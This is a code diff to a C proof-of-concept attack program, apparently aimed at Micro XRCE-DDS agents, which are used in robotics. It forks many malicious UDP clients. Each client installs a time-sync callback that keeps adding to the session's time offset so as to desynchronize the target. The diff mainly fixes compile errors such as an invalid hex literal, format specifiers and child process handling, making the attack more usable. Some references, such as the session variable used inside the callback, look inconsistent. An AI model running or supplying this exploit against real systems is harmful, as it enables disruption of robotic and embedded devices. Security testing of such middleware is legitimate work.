@@ -4,8 +4,10 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
-#define NUM_CLIENTS 50
+#define NUM_CLIENTS 20
 
 int64_t malicious_offset = 0;
 
@@ -17,27 +19,30 @@ void malicious_time_callback(
         int64_t originate_timestamp,
         void* args)
 {
-    // Force massive time offset
-    malicious_offset += 10000000; // Add 10 seconds each call
+    (void)current_time;
+    (void)transmit_timestamp;
+    (void)received_timestamp;
+    (void)originate_timestamp;
+    (void)args;
+    
+    malicious_offset += 10000000;
     session->time_offset = malicious_offset;
     
-    printf("[*] Corrupted time offset to: %ld microseconds (%.2f seconds)\n", 
-           malicious_offset, malicious_offset / 1000000.0);
+    printf("[*] Corrupted time offset to: %lld microseconds (%.2f seconds)\n", 
+           (long long)malicious_offset, malicious_offset / 1000000.0);
 }
 
 void attack_single_client(char* ip, char* port, int client_id) {
     printf("[Client %d] Starting time desync attack...\n", client_id);
     
-    // Initialize transport
     uxrUDPTransport transport;
     if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
         printf("[Client %d] Failed to init transport\n", client_id);
         return;
     }
     
-    // Create session
     uxrSession session;
-    uint32_t key = 0xTIME0000 + client_id;
+    uint32_t key = 0x71E00000 + client_id;
     uxr_init_session(&session, &transport.comm, key);
     
     if (!uxr_create_session(&session)) {
@@ -46,22 +51,19 @@ void attack_single_client(char* ip, char* port, int client_id) {
         return;
     }
     
-    // Install malicious time callback
     uxr_set_time_callback(&session, malicious_time_callback, NULL);
     
-    // Continuously desynchronize
     printf("[Client %d] Desynchronizing time...\n", client_id);
     for (int i = 0; i < 100; i++) {
         uxr_sync_session(&session, 1000);
-        usleep(100000); // 100ms
+        usleep(100000);
         
         if (i % 10 == 0) {
-            printf("[Client %d] Desync iteration %d, offset: %ld us\n", 
-                   client_id, i, session.time_offset);
+            printf("[Client %d] Desync iteration %d, offset: %lld us\n", 
+                   client_id, i, (long long)session.time_offset);
         }
     }
     
-    // Cleanup
     uxr_delete_session(&session);
     uxr_close_udp_transport(&transport);
     
@@ -81,24 +83,23 @@ int main(int argc, char** argv) {
     printf("Target: %s:%s\n", ip, port);
     printf("Number of malicious clients: %d\n\n", NUM_CLIENTS);
     
-    // Launch multiple clients to amplify attack
     for (int i = 0; i < NUM_CLIENTS; i++) {
         pid_t pid = fork();
         
         if (pid == 0) {
-            // Child process
             attack_single_client(ip, port, i);
             exit(0);
         } else if (pid < 0) {
             printf("[-] Fork failed for client %d\n", i);
         }
         
-        usleep(100000); // Stagger client starts
+        usleep(100000);
     }
     
-    // Wait for all children
     printf("[*] Waiting for all clients to complete...\n");
-    sleep(30);
+    for (int i = 0; i < NUM_CLIENTS; i++) {
+        wait(NULL);
+    }
     
     printf("\n[*] Attack completed\n");
     return 0;
